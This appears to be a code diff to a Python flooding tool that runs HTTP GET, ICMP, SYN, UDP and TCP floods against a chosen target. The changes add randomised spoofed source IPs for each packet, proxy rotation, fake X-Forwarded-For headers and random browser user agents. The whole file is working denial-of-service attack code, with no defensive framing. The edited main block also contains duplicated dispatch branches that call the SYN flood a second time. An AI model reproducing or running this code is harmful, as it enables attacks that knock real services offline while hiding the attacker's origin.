@@ -1,3 +1,4 @@
+import asyncio
 import aiohttp
 import time
 import requests
@@ -10,6 +11,9 @@ from scapy.all import *
 import platform
 import subprocess
 import ctypes
+
+max_packet_size = 1400
+status_helper = []
 
 def disclaimer():
     green = "\033[32m"
@@ -28,6 +32,18 @@ def disclaimer():
     ==============================================================
     """ + reset)
 
+
+def packet_validation(args):
+    if args.weight > max_packet_size:
+        size_answer = input("WARNING packet can get fragmented still continue? (y/n)")
+        if size_answer.lower() in ["n", "no"]:
+            print("exiting...")
+            sys.exit()
+        elif size_answer.lower() in ["y", "yes"]:
+            pass
+    
+    else:
+        pass        
 
 def administrator_check():
     system = platform.system()
@@ -59,9 +75,9 @@ def randomip():
             continue  
         if first == 192 and second == 168:
             continue 
-        if first == 169 and second == 254: 
+        if first == 169 and second == 254:
             continue 
-        if first == 127: 
+        if first == 127:
             continue 
         return ip
 
@@ -79,11 +95,51 @@ def ip_validation_target(args):
         print("invalid ip address. please try again.")
         sys.exit()
 
+def proxy_helper(args):
+    proxies = args.proxies
+    proxy = random.choice(proxies) if proxies else None
+    if proxy and not proxy.startswith(("http://", "https://", "socks5://", "socks4://")):
+        print(f"WARNING proxy format may be invalid: {proxy}")
+
+    x_forwarded_for = randomip() if not proxy else None
+    return proxy, x_forwarded_for
+
+def source_helper(args):
+    if args.src == "random":
+        source_ip = randomip()
+    else:
+        source_ip = args.src
+    return source_ip    
 
 
-async def statuscode(session, url):
-    async with session.get(url) as response:
-        print("status code:" , response.status)
+async def statuscode(session, args):
+    proxy, x_forwarded_for = proxy_helper(args)
+    async with session.get(args.url,
+                    headers={
+                        "User-Agent": user_agent(),
+                        "X-Forwarded-For": x_forwarded_for
+                        },
+                        proxy=proxy,) as response:
+        status = response.status
+        if not status_helper:  
+            if 200 <= status < 300:
+                print(f"url is valid (status {status}: success)")
+
+            elif 300 <= status < 400:
+                print(f"url returned a redirection (status {status}).")
+
+            elif 400 <= status < 500:
+                print(f"client error detected (status {status}: check the url)")
+
+            elif 500 <= status < 600:
+                print(f"server error detected (status {status})")
+
+            else:
+                print(f"unexpected status code {status}")
+            status_helper.append(1)
+        else:
+            print(f"status code {status}")
+
 
 def Keyboard_interrupt_helper():
     print("stopped by user:")
@@ -98,13 +154,13 @@ def user_agent():
     os = ["debian", "windows",]
     major_chrome = random.randint(125, 137)
     minor_chrome = random.randint(0, 9)
-    bulid_chrome = random.randint(1000, 9999)
+    build_chrome = random.randint(1000, 9999)
     patch_chrome = random.randint(0, 99)
     major_firefox=random.randint(120,134)
     minor_firefox=0
     os_choice = random.choice(os)
     browser = random.choice(browsers)
-    all_chrome = f"{major_chrome}.{minor_chrome}.{bulid_chrome}.{patch_chrome}"
+    all_chrome = f"{major_chrome}.{minor_chrome}.{build_chrome}.{patch_chrome}"
     all_firefox = f"{major_firefox}.{minor_firefox}"
 
     if os_choice == "debian" and browser == "chrome":
@@ -120,46 +176,19 @@ def user_agent():
         return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{all_chrome} Safari/537.36"
     
 
-def check_status_code(url):
-    try:
-        response = requests.get(url)
-        status = response.status_code
-        
-        if 200 <= status < 300:
-            print(f"url is valid (status {status}: success)")
-
-        elif 300 <= status < 400:
-            print(f"url returned a redirection (status {status}).")
-
-        elif 400 <= status < 500:
-            print(f"client error detected (status {status}: check the url)")
-
-        elif 500 <= status < 600:
-            print(f"server error detected (status {status})")
-
-        else:
-            print(f"unexpected status code {status}")
-    except requests.exceptions.RequestException as e:
-        print("unexpected error: ", e)
-
 async def http_get_flood(args):
     disclaimer()
     try:
-        check_status_code(args.url)
         timeout_info = aiohttp.ClientTimeout(total=args.timeout)
         async with aiohttp.ClientSession(timeout=timeout_info) as session:
+            await statuscode(session, args)
             start_time = time.time()
             useragent= user_agent()
             while True:
                 if time.time() - start_time >= args.duration:
                     break
-                proxies = args.proxies
-                tasks = []
-                proxy = random.choice(proxies) if proxies else None
-                if not proxy:
-                    x_forwarded_for = randomip()
-                else:
-                    x_forwarded_for = None
+                tasks = []    
+                proxy, x_forwarded_for = proxy_helper(args)
                 for i in range(args.quantity):
                     tasks.append(session.get(
                         args.url,
@@ -172,25 +201,27 @@ async def http_get_flood(args):
                     )   
                 await asyncio.gather(*tasks)
                 await asyncio.sleep(args.delay)
-                await statuscode(session, args.url)
+                await statuscode(session, args)
     except KeyboardInterrupt:
         Keyboard_interrupt_helper()
     except Exception:
         exception_helper()     
-                       
-
-
+                    
+                    
 async def icmpflood(args):
     disclaimer()
+    packet_validation(args)
     if not administrator_check():
         print("need root privileges for icmp flood")
         sys.exit()
     try:
         start_time = time.time()
         while True:
+
             if time.time() - start_time >= args.duration:
                 break
-            base_packet = IP(src=args.src,
+            source_ip = source_helper(args)    
+            base_packet = IP(src=source_ip,
                              dst=args.target_ip,
                              ttl=args.ttl
                              )/ICMP()
@@ -206,6 +237,7 @@ async def icmpflood(args):
         Keyboard_interrupt_helper()
     except Exception:
         exception_helper() 
+
 
 async def tcp_flood(args):
     disclaimer()
@@ -236,8 +268,10 @@ def make_tcp_connection(args):
     except Exception:
         exception_helper()
 
+
 async def udp_flood(args):
     disclaimer()
+    packet_validation(args)
     if not administrator_check():
         print("Need root privileges for udp flood")
         sys.exit()
@@ -246,7 +280,8 @@ async def udp_flood(args):
         while True:
             if time.time() - start_time >= args.duration:
                 break
-            udp_ip_pkt = IP(src=args.src,
+            source_ip = source_helper(args)    
+            udp_ip_pkt = IP(src=source_ip,
                             dst=args.target_ip,
                             ttl=args.ttl
                             )
@@ -267,6 +302,7 @@ async def udp_flood(args):
 
 async def synflood(args):
     disclaimer()
+    packet_validation(args)
     if not administrator_check():
         print("need root privileges for syn flood")
         sys.exit()
@@ -275,8 +311,9 @@ async def synflood(args):
         while True:
             if time.time() - start_time >= args.duration:
                 break
+            source_ip = source_helper(args)    
             ip_pkt = IP(
-                src=args.src,
+                src=source_ip,
                 dst=args.target_ip,
                 ttl=args.ttl
             )
@@ -305,9 +342,9 @@ http_parser.add_argument("--proxies", type=str, nargs="+", default=None, help="L
 http_parser.add_argument("--timeout", type=int, default=64, help="http request timeout")
 
 icmp_parser = subparsers.add_parser("icmpflood", help="icmp mode")
-icmp_parser.add_argument("--quantity", type=int, default=100, required=True, help="number of requests per bunch")
+icmp_parser.add_argument("--quantity", type=int, default=100, help="number of requests per bunch")
 icmp_parser.add_argument("--target_ip", type=str, required=True, help="target ip")
-icmp_parser.add_argument("--src", type=str, default=randomip(), help="source ip (random by default)")
+icmp_parser.add_argument("--src", type=str, default="random", help="source ip (random by default)")
 icmp_parser.add_argument("--duration", type=int, default=60, help="duration of the attack(in seconds)")
 icmp_parser.add_argument("--weight", type=int, default=64, help="packet size")
 icmp_parser.add_argument("--delay", type=int, default=1, help="delay after each bunch")
@@ -318,7 +355,7 @@ syn_parser.add_argument("--weight", type=int, default=64, help="packet size")
 syn_parser.add_argument("--target_ip", type=str, required=True, help="target ip")
 syn_parser.add_argument("--quantity", type=int, default=100, help="number of requests per bunch")
 syn_parser.add_argument("--delay", type=int, default=1 , help="delay after each bunch")
-syn_parser.add_argument("--src", type=str, default=randomip() , help="source ip (random by default)")
+syn_parser.add_argument("--src", type=str, default="random" , help="source ip (random by default)")
 syn_parser.add_argument("--duration", type=int, default=60, help="duration of the attack(in seconds)") 
 syn_parser.add_argument("--port", type=int, default=443, help="destination port" )
 syn_parser.add_argument("--ttl", type=int, default=64, help="time to live for packets")
@@ -329,7 +366,7 @@ udp_parser.add_argument("--quantity", type=int, default=100,help="number of requ
 udp_parser.add_argument("--weight", type=int, default=64, help="packet size")
 udp_parser.add_argument("--delay", type=int, default=1, help="delay after each bunch")
 udp_parser.add_argument("--duration", type=int, default=60, help="duration of the attack(in seconds)")
-udp_parser.add_argument("--src", type=str, default=randomip(), help="source ip (random by default)")
+udp_parser.add_argument("--src", type=str, default="random", help="source ip (random by default)")
 udp_parser.add_argument("--port", type=int, default=443, help="destination port")
 udp_parser.add_argument("--ttl", type=int, default=64, help="time to live for packets")
 
@@ -339,22 +376,32 @@ tcp_parser.add_argument("--port", type=int, default=443, help="target port")
 tcp_parser.add_argument("--quantity", type=int, default=100, help="number of connections")
 tcp_parser.add_argument("--delay", type=int, default=1, help="delay after each bunch")
 tcp_parser.add_argument("--duration", type=int, default=60, help="duration of the attack(in seconds)")
-tcp_parser.add_argument("--timeout", type=int, default=2, help="tcp conection timeout")
+tcp_parser.add_argument("--timeout", type=int, default=2, help="tcp connection timeout")
 
 if __name__ == "__main__":
     args = parser.parse_args()
     if args.command == "httpflood":
         asyncio.run(http_get_flood(args))
     elif args.command == "icmpflood":
-        ip_validation_src(args)
+        if args.src != "random":
+            ip_validation_src(args)
         asyncio.run(icmpflood(args))
     elif args.command == "synflood":
-        ip_validation_src(args)
+        if args.src != "random":
+            ip_validation_src(args)
+        asyncio.run(synflood(args)) 
+    elif args.command == "udpflood":
+        if args.src != "random":
+            ip_validation_src(args)
+        asyncio.run(udp_flood(args))
+    elif args.command == "tcpflood":
+        ip_validation_target(args)
+        asyncio.run(tcp_flood(args))
         asyncio.run(synflood(args)) 
     elif args.command == "udpflood":
         ip_validation_src(args)
         asyncio.run(udp_flood(args))
     elif args.command == "tcpflood":
         ip_validation_target(args)
-
         asyncio.run(tcp_flood(args))
+
